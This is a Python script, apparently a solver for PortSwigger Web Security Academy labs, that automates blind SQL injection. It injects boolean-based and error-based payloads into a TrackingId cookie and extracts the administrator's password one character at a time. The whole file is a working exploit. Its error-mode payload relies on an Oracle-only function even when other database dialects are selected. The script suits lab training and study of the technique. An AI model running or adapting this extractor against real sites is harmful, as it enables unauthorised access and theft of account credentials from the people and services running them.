#!/usr/bin/env python3
"""
Blind SQL Injection - Multi-mode password extractor
PortSwigger Web Security Academy Labs

Supports two detection modes:
  boolean  — infers characters via a conditional response oracle ("Welcome back")
  error    — infers characters via HTTP 500 (true) vs 200 (false) using error-based payloads

Supports four database dialects (controls SUBSTR function syntax):
  postgresql, mysql, mssql  — SUBSTRING(str, pos, 1)
  oracle                    — SUBSTR(str, pos, 1)
"""
import argparse
import sys
import requests

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_POSITIONS = 30
PATH = "/filter?category=Gifts"

# Per-dialect substring function
SUBSTR_FN = {
    "postgresql": "SUBSTRING",
    "mysql":      "SUBSTRING",
    "mssql":      "SUBSTRING",
    "oracle":     "SUBSTR",
}


def build_payload(mode: str, db: str, tracking_id: str, session: str, position: int, char: str) -> str:
    fn = SUBSTR_FN[db]

    if mode == "boolean":
        sqli = (
            f"' AND {fn}("
            f"(SELECT password FROM users WHERE username='administrator')"
            f",{position},1)='{char}'--"
        )
    else:  # error
        sqli = (
            f"'||(SELECT CASE WHEN ({fn}(password,{position},1)='{char}') "
            f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--"
        )

    return f"TrackingId={tracking_id}{sqli}; session={session}"


def is_true(mode: str, response: requests.Response) -> bool:
    if mode == "boolean":
        return "Welcome back" in response.text
    else:  # error
        return response.status_code == 500


def extract_password(url: str, session: str, tracking_id: str, mode: str, db: str) -> str:
    target = url.rstrip("/") + PATH
    print(f"[*] Target : {target}")
    print(f"[*] Mode   : {mode}")
    print(f"[*] DB     : {db}")
    print(f"[*] Extracting administrator password ({MAX_POSITIONS} chars max)...\n")

    password = ""
    for position in range(1, MAX_POSITIONS + 1):
        found = False
        for char in CHARSET:
            cookie = build_payload(mode, db, tracking_id, session, position, char)
            r = requests.get(target, headers={"Cookie": cookie}, timeout=10)
            if is_true(mode, r):
                password += char
                print(f"  Position {position:02d}: {char}  →  {password}")
                found = True
                break

        if not found:
            print(f"\n[*] No match at position {position} — extraction complete.")
            break

    return password


def main():
    parser = argparse.ArgumentParser(
        description="Blind SQLi password extractor — boolean and error modes (PortSwigger labs)"
    )
    parser.add_argument("--url", required=True,
                        help="Lab base URL, e.g. https://LABID.web-security-academy.net/")
    parser.add_argument("--session", required=True,
                        help="session cookie value from browser DevTools")
    parser.add_argument("--tracking-id", required=True,
                        help="TrackingId cookie value from browser DevTools")
    parser.add_argument("--mode", choices=["boolean", "error"], default="boolean",
                        help="boolean = Welcome back oracle | error = HTTP 500 oracle")
    parser.add_argument("--db", choices=list(SUBSTR_FN.keys()), default="postgresql",
                        help="Database dialect — controls SUBSTR vs SUBSTRING syntax")
    args = parser.parse_args()

    password = extract_password(
        args.url, args.session, args.tracking_id, args.mode, args.db
    )
    print(f"\n[+] Password: {password}")


if __name__ == "__main__":
    main()
